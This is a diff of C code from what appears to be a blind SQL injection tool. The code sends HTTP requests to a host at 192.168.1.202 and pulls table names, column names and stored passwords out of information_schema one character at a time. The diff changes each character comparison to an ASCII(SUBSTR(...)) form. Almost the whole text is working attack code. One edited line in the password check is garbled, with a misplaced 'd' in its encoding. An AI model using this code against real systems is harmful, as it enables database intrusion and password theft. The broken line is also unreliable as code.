@@ -236,7 +236,7 @@ bool check_table(const void *ctx) {
         "FROM%%20information_schema.TABLES%%20"
         "WHERE%%20table_name%%20LIKE%%20%%27%%25usr%%25%%27%%20"
         "AND%%20table_name%%20LIKE%%20%%27%s%%25%%27%%20" // %s = discovered (Literal)
-        "AND%%20SUBSTR(table_name,%i,1)<%%3d%%27%s%%27%%20"
+        "AND%%20ASCII(SUBSTR(table_name,%i,1))<%%3dASCII(%%27%s%%27)%%20"
         "LIMIT%%201;"
         " HTTP/1.1\r\n"
         "Host: 192.168.1.202\r\n"
@@ -258,7 +258,7 @@ bool check_column(const void *ctx) {
         "WHERE%%20LOWER%%28table_name%%29%%3dLOWER%%28%%27%s%%27%%29%%20" // %s = table_name
         "AND%%20column_name%%20LIKE%%20%%27%%25%s%%25%%27%%20" // %s = col_to_find
         "AND%%20column_name%%20LIKE%%20%%27%s%%25%%27%%20" // %s = discovered
-        "AND%%20SUBSTR(column_name,%i,1)<%%3d%%27%s%%27%%20"
+        "AND%%20ASCII(SUBSTR(column_name,%i,1))<%%3dASCII(%%27%s%%27)%%20"
         "LIMIT%%201;"
         " HTTP/1.1\r\n"
         "Host: 192.168.1.202\r\n"
@@ -284,9 +284,9 @@ bool check_password(const void *ctx) {
         "%%3d322695107%%20AND%%20"
         "%%60%s%%60" // AND `pwd_col`...
         "%%20LIKE%%20%%27%s%%25%%27%%20" // ...LIKE 'discovered%'
-        "AND%%20SUBSTR("
+        "AND%%20ASCII(SUBSTR("
         "%%60%s%%60" // SUBSTR(`pwd_col`...)
-        ",%i,1)<%%3d%%27%s%%27%%20"
+        ",%i,1))<%%3ASCII(d%%27%s%%27)%%20"
         "LIMIT%%201;"
         " HTTP/1.1\r\n"
         "Host: 192.168.1.202\r\n"
@@ -347,7 +347,7 @@ const char *url_map[96] = {
     "%5C", // 0x5C \ (Backslash)
     "%5D", // 0x5D ]
     "%5E", // 0x5E ^
-    "%5F",   // 0x5F _
+    "%5F", // 0x5F _
     "%60", // 0x60 `
 
     // --- 0x61 to 0x7A (Lowercase a-z Unreserved) ---
